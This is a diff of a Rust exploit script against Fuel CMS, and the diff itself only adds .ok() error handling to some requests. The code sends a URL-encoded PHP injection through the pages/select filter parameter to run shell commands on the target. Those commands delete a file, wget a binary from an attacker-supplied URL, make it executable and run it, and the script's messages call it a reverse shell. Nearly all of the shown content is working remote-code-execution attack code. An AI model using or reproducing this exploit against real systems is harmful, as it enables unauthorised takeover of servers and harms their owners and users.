@@ -54,7 +54,7 @@ async fn main() {
             }
 
             regular_out!(format!("Downloading file..."));
-            reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"rm malfile"##))).await;
+            reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"rm malfile"##))).await.ok();
             let resp_down = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(&format!(r##"wget -O malfile {}"##, args[2])))).await;
             if resp_down.unwrap().status() == 200 {
                 okay_out!("Reverse shell downloaded!");
@@ -64,7 +64,7 @@ async fn main() {
             }
 
             regular_out!(format!("Running file..."));
-            let resp_chmod = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"chmod +x malfile"##))).await;
+            reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"chmod +x malfile"##))).await.ok();
             let resp_run = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"./malfile"##))).await;
             if resp_run.unwrap().status() == 200 {
                 okay_out!("File ran!");
